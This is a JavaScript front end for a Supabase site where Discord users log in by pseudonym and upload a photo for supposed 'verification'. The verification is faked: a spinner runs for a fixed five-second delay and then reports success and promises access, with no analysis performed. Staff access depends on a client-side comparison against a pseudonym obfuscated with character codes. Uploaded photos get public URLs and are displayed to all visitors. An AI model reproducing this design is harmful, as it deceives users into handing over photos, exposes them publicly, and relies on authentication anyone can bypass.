const DEFAULT_STAFF_PSEUDO = String.fromCharCode(67, 111, 111, 107, 105, 101, 48, 50, 46);
const SESSION_KEY = "web_sender_current_user";
const RAW_CONFIG = window.WEB_SENDER_CONFIG || {};

const SUPABASE_URL = String(RAW_CONFIG.supabaseUrl || "").trim();
const SUPABASE_ANON_KEY = String(RAW_CONFIG.supabaseAnonKey || "").trim();
const STORAGE_BUCKET = String(RAW_CONFIG.bucket || "photos").trim() || "photos";
const STAFF_PSEUDO = String(RAW_CONFIG.staffPseudo || DEFAULT_STAFF_PSEUDO);

const CONFIG_READY =
  Boolean(SUPABASE_URL) &&
  Boolean(SUPABASE_ANON_KEY) &&
  !SUPABASE_URL.includes("YOUR_") &&
  !SUPABASE_ANON_KEY.includes("YOUR_");

const supabaseClient =
  CONFIG_READY && window.supabase && typeof window.supabase.createClient === "function"
    ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY)
    : null;

const loginView = document.getElementById("loginView");
const userView = document.getElementById("userView");
const staffView = document.getElementById("staffView");

const loginForm = document.getElementById("loginForm");
const pseudoInput = document.getElementById("discordPseudo");
const displayPseudo = document.getElementById("displayPseudo");
const setupNotice = document.getElementById("setupNotice");

const uploadForm = document.getElementById("uploadForm");
const photoInput = document.getElementById("photoInput");
const staffConsent = document.getElementById("staffConsent");
const statusBox = document.getElementById("statusBox");

const staffList = document.getElementById("staffList");
const disconnectUser = document.getElementById("disconnectUser");
const disconnectStaff = document.getElementById("disconnectStaff");
const floatingField = document.querySelector(".floating-folders");
const statusFilter = document.getElementById("statusFilter");
const searchStaff = document.getElementById("searchStaff");
const refreshStaff = document.getElementById("refreshStaff");
const staffStats = document.getElementById("staffStats");

const STATUS_OPTIONS = ["en attente", "accepté", "refusé"];
const STATUS_LABELS = {
  "en attente": "En attente",
  accepté: "Accepté",
  refusé: "Refusé"
};

let staffCache = [];
let schemaSupportsStaffFields = true;

let currentPseudo = null;

function setStatus(message, type) {
  statusBox.innerHTML = "";
  statusBox.textContent = message;
  statusBox.className = `status ${type}`;
  statusBox.classList.remove("hidden");
}

function setLoadingStatus() {
  statusBox.className = "status loading";
  statusBox.innerHTML = `
    <div class="loading-wrap">
      <span class="loading-spinner" aria-hidden="true"></span>
      <div class="loading-copy">
        <p class="loading-title">Verification en cours...</p>
        <p class="loading-sub">Analyse de la photo en cours</p>
        <div class="loading-bar">
          <span class="loading-fill"></span>
        </div>
      </div>
    </div>
  `;
  statusBox.classList.remove("hidden");
}

function hideStatus() {
  statusBox.innerHTML = "";
  statusBox.className = "status hidden";
}

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function escapeHtml(value) {
  const source = String(value || "");
  return source
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/\"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function setActiveView(viewName) {
  loginView.classList.add("hidden");
  userView.classList.add("hidden");
  staffView.classList.add("hidden");

  if (viewName === "staff") {
    staffView.classList.remove("hidden");
    renderStaffList();
    return;
  }

  if (viewName === "user") {
    userView.classList.remove("hidden");
    displayPseudo.textContent = currentPseudo;
    return;
  }

  loginView.classList.remove("hidden");
}

function connectWithPseudo(pseudo) {
  currentPseudo = pseudo;
  localStorage.setItem(SESSION_KEY, pseudo);

  if (pseudo === STAFF_PSEUDO) {
    setActiveView("staff");
    return;
  }

  setActiveView("user");
}

function disconnect() {
  currentPseudo = null;
  localStorage.removeItem(SESSION_KEY);
  loginForm.reset();
  uploadForm.reset();
  hideStatus();
  setActiveView("login");
}

function formatDate(isoValue) {
  const date = new Date(isoValue);
  if (Number.isNaN(date.getTime())) {
    return "date inconnue";
  }

  return date.toLocaleString("fr-FR", {
    dateStyle: "medium",
    timeStyle: "short"
  });
}

function buildPublicPhotoUrl(path) {
  const { data } = supabaseClient.storage.from(STORAGE_BUCKET).getPublicUrl(path);
  return data?.publicUrl || "";
}

function populateFloatingPhotos(submissions) {
  if (!floatingField) {
    return;
  }

  const spans = Array.from(floatingField.children);
  spans.forEach((span, index) => {
    const entry = (Array.isArray(submissions) ? submissions : [])[index];
    if (entry && entry.photo_path) {
      const photoUrl = buildPublicPhotoUrl(entry.photo_path);
      if (photoUrl) {
        span.style.setProperty("--floating-bg", `url("${photoUrl}")`);
        span.classList.add("has-photo");
        return;
      }
    }

    span.style.setProperty("--floating-bg", "url('folder.svg')");
    span.classList.remove("has-photo");
  });
}

async function refreshFloatingPhotos() {
  if (!supabaseClient) {
    return;
  }

  try {
    const submissions = await fetchSubmissions();
    populateFloatingPhotos(submissions.slice(0, 9));
  } catch (cause) {
    // keep default imagery if the fetch fails
    populateFloatingPhotos([]);
  }
}

function getStatusLabel(value) {
  return STATUS_LABELS[value] || value || "En attente";
}

function getStatusClass(value) {
  const normalized = String(value || "en attente").toLowerCase();
  return normalized.replace(/[^a-z0-9]+/g, "-");
}

function applyStaffFilters(entries = []) {
  const filterValue = statusFilter?.value;
  const searchTerm = (searchStaff?.value || "").trim().toLowerCase();
  return entries.filter((entry) => {
    const matchesStatus = !filterValue || entry.status === filterValue;
    if (!matchesStatus) {
      return false;
    }
    if (!searchTerm) {
      return true;
    }
    const candidate = String(entry.pseudo || "").toLowerCase();
    return candidate.includes(searchTerm);
  });
}

function updateStaffStats(entries = []) {
  if (!staffStats) {
    return;
  }

  const counts = STATUS_OPTIONS.reduce((acc, status) => {
    acc[status] = 0;
    return acc;
  }, {});
  let priorityCount = 0;

  entries.forEach((entry) => {
    const statusKey = entry.status || "en attente";
    if (counts[statusKey] !== undefined) {
      counts[statusKey] += 1;
    }
    if (entry.priority) {
      priorityCount += 1;
    }
  });

  staffStats.innerHTML = `
    <span class="staff-stat">Total : <strong>${entries.length}</strong></span>
    <span class="staff-stat staff-stat--pending">${counts["en attente"] || 0} en attente</span>
    <span class="staff-stat staff-stat--accepted">${counts["accepté"] || 0} acceptés</span>
    <span class="staff-stat staff-stat--refused">${counts["refusé"] || 0} refusés</span>
    <span class="staff-stat staff-stat--priority">${priorityCount} prioritaires</span>
  `;
}

function renderStaffEntries(entries) {
  if (!staffList) {
    return;
  }

  if (!entries.length) {
    const message = staffCache.length
      ? "Aucune entrée ne correspond aux filtres sélectionnés."
      : "Aucun dossier recu pour le moment.";
    staffList.innerHTML = `<div class="empty">${message}</div>`;
    return;
  }

  const html = entries
    .map((entry) => {
      const safePseudo = escapeHtml(entry.pseudo || "inconnu");
      const safeTime = escapeHtml(formatDate(entry.created_at));
      const safeId = escapeHtml(entry.id);
      const rawPath = String(entry.photo_path || "");
      const encodedPath = encodeURIComponent(rawPath);
      const photoUrl = buildPublicPhotoUrl(entry.photo_path || "");
      const safePhotoUrl = escapeHtml(photoUrl);
      const downloadName = escapeHtml(`photo-${entry.pseudo || "joueur"}.jpg`);
      const noteValue = escapeHtml(entry.staff_note || "");
      const currentStatus = STATUS_OPTIONS.includes(entry.status) ? entry.status : "en attente";
      const statusClass = getStatusClass(currentStatus);
      const statusLabel = getStatusLabel(currentStatus);
      const optionNodes = STATUS_OPTIONS.map(
        (option) =>
          `<option value="${option}" ${option === currentStatus ? "selected" : ""}>${getStatusLabel(option)}</option>`
      ).join("");
      const priorityClass = entry.priority ? "entry--priority" : "";
      const priorityLabel = entry.priority ? "Retirer de la mise en avant" : "Mettre en avant";

      return `
        <article class="entry ${priorityClass}">
          <img src="${safePhotoUrl}" alt="Photo de ${safePseudo}" />
          <div class="entry-meta">
            <div class="entry-meta-head">
              <strong>${safePseudo}</strong>
              <span class="status-chip status-chip--${statusClass}">${statusLabel}</span>
            </div>
            <p>Envoye le ${safeTime}</p>
            <label class="entry-status">
              <span>Statut</span>
              <select data-field="status" data-id="${safeId}">
                ${optionNodes}
              </select>
            </label>
            <label class="staff-note">
              <span>Note staff</span>
              <textarea data-note-id="${safeId}" rows="2" maxlength="280" placeholder="Ajoute une remarque">${noteValue}</textarea>
            </label>
            <div class="staff-note-actions">
              <button class="ghost save-note" type="button" data-id="${safeId}">Sauvegarder la note</button>
            </div>
          </div>
          <div class="entry-actions">
            <a href="${safePhotoUrl}" target="_blank" rel="noopener noreferrer">Voir la photo</a>
            <a href="${safePhotoUrl}" download="${downloadName}">Telecharger la photo</a>
            <button type="button" class="ghost copy-link" data-url="${safePhotoUrl}">Copier le lien</button>
            <button type="button" class="ghost toggle-priority" data-id="${safeId}" data-priority="${entry.priority ? "true" : "false"}">
              ${priorityLabel}
            </button>
            <button class="delete-btn" type="button" data-id="${safeId}" data-path="${encodedPath}">Supprimer le dossier</button>
          </div>
        </article>
      `;
    })
    .join("");

  staffList.innerHTML = html;
}

async function updateSubmissionField(submissionId, payload) {
  if (!supabaseClient) {
    throw new Error("Configuration Supabase manquante");
  }

  const { error } = await supabaseClient.from("submissions").update(payload).eq("id", submissionId);
  if (error) {
    throw new Error(error.message || "Mise à jour impossible");
  }
}

function sanitizePseudoForFile(pseudo) {
  const cleaned = String(pseudo || "").replace(/[^a-zA-Z0-9_.-]/g, "_");
  return cleaned.slice(0, 40) || "user";
}

function extensionFromFile(fileName) {
  const pieces = String(fileName || "").split(".");
  const ext = pieces.length > 1 ? pieces.pop() : "jpg";
  return (ext || "jpg").toLowerCase().replace(/[^a-z0-9]/g, "") || "jpg";
}

async function createSubmission(pseudo, file) {
  const fileExt = extensionFromFile(file.name);
  const safePseudo = sanitizePseudoForFile(pseudo);
  const filePath = `${safePseudo}/${Date.now()}-${crypto.randomUUID()}.${fileExt}`;

  const { error: uploadError } = await supabaseClient.storage
    .from(STORAGE_BUCKET)
    .upload(filePath, file, { cacheControl: "3600", upsert: false });

  if (uploadError) {
    throw new Error(uploadError.message || "Upload impossible");
  }

  const { error: insertError } = await supabaseClient.from("submissions").insert([
    {
      pseudo,
      photo_path: filePath
    }
  ]);

  if (insertError) {
    await supabaseClient.storage.from(STORAGE_BUCKET).remove([filePath]);
    throw new Error(insertError.message || "Ecriture base impossible");
  }
}

async function fetchSubmissions() {
  const selectFields = schemaSupportsStaffFields
    ? "id, pseudo, photo_path, created_at, status, staff_note, priority"
    : "id, pseudo, photo_path, created_at";

  const { data, error } = await supabaseClient
    .from("submissions")
    .select(selectFields)
    .order("created_at", { ascending: false });

  if (error) {
    const message = String(error.message || "");
    if (
      schemaSupportsStaffFields &&
      /(submissions\.)?(status|staff_note|priority)\s+does not exist/i.test(message)
    ) {
      schemaSupportsStaffFields = false;
      return fetchSubmissions();
    }

    throw new Error(message || "Lecture des dossiers impossible");
  }

  return Array.isArray(data) ? data : [];
}

async function deleteSubmission(submissionId, photoPath) {
  const { error: storageError } = await supabaseClient.storage.from(STORAGE_BUCKET).remove([photoPath]);
  if (storageError) {
    throw new Error(storageError.message || "Suppression photo impossible");
  }

  const { error: dbError } = await supabaseClient.from("submissions").delete().eq("id", submissionId);
  if (dbError) {
    throw new Error(dbError.message || "Suppression dossier impossible");
  }
}

async function renderStaffList() {
  if (!supabaseClient) {
    staffList.innerHTML = '<div class="empty">Configuration Supabase manquante.</div>';
    return;
  }

  staffList.innerHTML = '<div class="empty">Chargement des dossiers...</div>';

  try {
    const submissions = await fetchSubmissions();
    staffCache = Array.isArray(submissions) ? submissions : [];
    populateFloatingPhotos(staffCache);
    updateStaffStats(staffCache);
    renderStaffEntries(applyStaffFilters(staffCache));
  } catch (error) {
    staffList.innerHTML = `<div class="empty">${escapeHtml(error.message || "Erreur de lecture")}</div>`;
    populateFloatingPhotos([]);
    updateStaffStats([]);
  }
}

function disableAppForSetup(message) {
  setupNotice.textContent = message;
  setupNotice.classList.remove("hidden");
  pseudoInput.disabled = true;
  loginForm.querySelector("button[type='submit']").disabled = true;
}

loginForm.addEventListener("submit", (event) => {
  event.preventDefault();

  if (!supabaseClient) {
    return;
  }

  const pseudo = pseudoInput.value.trim();
  if (!pseudo) {
    pseudoInput.focus();
    return;
  }

  connectWithPseudo(pseudo);
});

uploadForm.addEventListener("submit", async (event) => {
  event.preventDefault();

  if (!supabaseClient) {
    setStatus("Configuration serveur manquante.", "error");
    return;
  }

  if (!currentPseudo) {
    setStatus("Session invalide, reconnecte-toi.", "error");
    return;
  }

  const file = photoInput.files?.[0];
  if (!file) {
    setStatus("Ajoute une photo avant de valider.", "error");
    return;
  }

  if (!staffConsent.checked) {
    setStatus("Tu dois cocher l'autorisation pour le staff.", "error");
    return;
  }

  const submitBtn = uploadForm.querySelector("button[type='submit']");
  submitBtn.disabled = true;
  setLoadingStatus();

  try {
    await Promise.all([createSubmission(currentPseudo, file), delay(5000)]);
    setStatus("Verification terminee. vous aurez acces dans quelques minutes", "success");
    alert("bien envoyé vous pouvez fermé le site");
    uploadForm.reset();
    await refreshFloatingPhotos();
  } catch (error) {
    setStatus(`Erreur pendant l'envoi: ${error.message || "reessaie"}`, "error");
  } finally {
    submitBtn.disabled = false;
  }
});

staffList.addEventListener("change", async (event) => {
  const target = event.target;
  if (!(target instanceof HTMLElement) || !target.matches("select[data-field='status']")) {
    return;
  }

  const submissionId = target.getAttribute("data-id");
  const newStatus = target.value;
  if (!submissionId || !STATUS_OPTIONS.includes(newStatus)) {
    return;
  }

  target.disabled = true;
  try {
    await updateSubmissionField(submissionId, { status: newStatus });
    await renderStaffList();
  } catch (error) {
    alert(`Erreur de mise à jour: ${error.message || "reessaie"}`);
  } finally {
    target.disabled = false;
  }
});

staffList.addEventListener("click", async (event) => {
  const target = event.target;
  if (!(target instanceof HTMLElement)) {
    return;
  }

  if (target.matches(".copy-link")) {
    const url = target.getAttribute("data-url") || "";
    if (!url) {
      return;
    }
    try {
      if (navigator.clipboard && navigator.clipboard.writeText) {
        await navigator.clipboard.writeText(url);
      } else {
        window.prompt("Copier le lien", url);
      }
      setStatus("Lien copié dans le presse-papiers.", "success");
    } catch (error) {
      setStatus("Impossible de copier le lien.", "error");
    }
    return;
  }

  if (target.matches(".toggle-priority")) {
    const entryId = target.getAttribute("data-id");
    if (!entryId) {
      return;
    }
    const currentValue = target.getAttribute("data-priority") === "true";
    try {
      await updateSubmissionField(entryId, { priority: !currentValue });
      await renderStaffList();
    } catch (error) {
      alert(`Erreur de mise à jour: ${error.message || "reessaie"}`);
    }
    return;
  }

  if (target.matches(".save-note")) {
    const entryId = target.getAttribute("data-id");
    if (!entryId) {
      return;
    }
    const noteInput = staffList.querySelector(`textarea[data-note-id="${entryId}"]`);
    const noteValue = noteInput ? noteInput.value.trim() : "";
    try {
      await updateSubmissionField(entryId, { staff_note: noteValue });
      setStatus("Note enregistrée.", "success");
      await renderStaffList();
    } catch (error) {
      alert(`Erreur de mise à jour: ${error.message || "reessaie"}`);
    }
    return;
  }

  if (!target.matches(".delete-btn")) {
    return;
  }

  const entryId = target.getAttribute("data-id");
  const encodedPath = target.getAttribute("data-path");

  if (!entryId || !encodedPath) {
    return;
  }

  const photoPath = decodeURIComponent(encodedPath);
  const shouldDelete = confirm("Supprimer ce dossier joueur ?");
  if (!shouldDelete) {
    return;
  }

  target.setAttribute("disabled", "true");

  try {
    await deleteSubmission(entryId, photoPath);
    await renderStaffList();
  } catch (error) {
    alert(`Erreur suppression: ${error.message || "reessaie"}`);
    target.removeAttribute("disabled");
  }
});

function handleStaffFiltersChange() {
  renderStaffEntries(applyStaffFilters(staffCache));
}

if (statusFilter) {
  statusFilter.addEventListener("change", handleStaffFiltersChange);
}

if (searchStaff) {
  searchStaff.addEventListener("input", handleStaffFiltersChange);
}

if (refreshStaff) {
  refreshStaff.addEventListener("click", renderStaffList);
}

disconnectUser.addEventListener("click", disconnect);
disconnectStaff.addEventListener("click", disconnect);

(function init() {
  if (!supabaseClient) {
    disableAppForSetup(
      "Configuration requise: complete le fichier config.js avec ton projet Supabase pour activer le stockage mondial."
    );
    setActiveView("login");
    return;
  }

  const savedPseudo = localStorage.getItem(SESSION_KEY);
  if (savedPseudo) {
    connectWithPseudo(savedPseudo);
    refreshFloatingPhotos();
    return;
  }

  setActiveView("login");
  refreshFloatingPhotos();
})();
